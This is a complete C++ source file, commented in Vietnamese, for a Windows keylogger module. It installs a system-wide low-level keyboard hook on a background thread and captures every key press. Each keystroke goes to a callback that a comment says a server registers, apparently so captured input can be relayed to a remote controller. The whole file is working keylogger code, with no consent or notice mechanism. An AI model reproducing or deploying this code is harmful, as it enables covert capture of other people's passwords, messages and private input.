#include "keylogging.h"

#ifdef _WIN32
#include <windows.h>
#include <winuser.h>
#pragma comment(lib, "user32.lib")
#endif

// CALLBACK do server đăng kí
static KeyEventCallback g_callback = nullptr;

void setKeyEventCallback(KeyEventCallback cb)
{
    g_callback = cb;
}

// Cờ hiệu an toàn luồng để ra lệnh dừng
static std::atomic<bool> g_isKeylogging(false);

// Handle của hook
static HHOOK g_keyboardHook = NULL;

// Luồng chạy vòng lặp message
static std::thread g_loggerThread;

// ID của luồng để có thể gửi tín hiệu dừng
static DWORD g_loggerThreadId = 0;

// === HÀM GHI LOG ===
void logKeystroke(int key)
{
    // Gửi CALLBACK
    if (g_callback)
        g_callback(key);

}

// === HÀM HOOK CALLBACK ===

/**
 * @brief Đây là hàm mà Windows gọi mỗi khi có phím được nhấn.
 */
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION &&
        (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
    {
        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT *)lParam;
        int key = kb->vkCode;

        // Luôn ghi log cục bộ
        logKeystroke(key);

    }
    return CallNextHookEx(g_keyboardHook, nCode, wParam, lParam);
}

// ===== LUỒNG HOOK =====
static void hookThread()
{
    g_loggerThreadId = GetCurrentThreadId();

    HINSTANCE hInst = GetModuleHandle(NULL);
    g_keyboardHook =
        SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInst, 0);

    if (!g_keyboardHook)
    {
        g_isKeylogging.store(false);
        return;
    }

    MSG msg;
    while (GetMessage(&msg, nullptr, 0, 0) > 0)
    {
        if (msg.message == WM_QUIT)
            break;
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(g_keyboardHook);
    g_keyboardHook = NULL;
    g_loggerThreadId = 0;
}

// ===== START / STOP =====
void startKeylogger()
{
    if (g_isKeylogging.load())
        return;
    g_isKeylogging.store(true);

    g_loggerThread = std::thread(hookThread);
}

void stopKeylogger()
{
    if (!g_isKeylogging.load())
        return;

    g_isKeylogging.store(false);

    if (g_keyboardHook && g_loggerThreadId != 0)
        PostThreadMessage(g_loggerThreadId, WM_QUIT, 0, 0);

    if (g_loggerThread.joinable())
        g_loggerThread.join();
}

bool isKeyloggerRunning()
{
    return g_isKeylogging.load();
}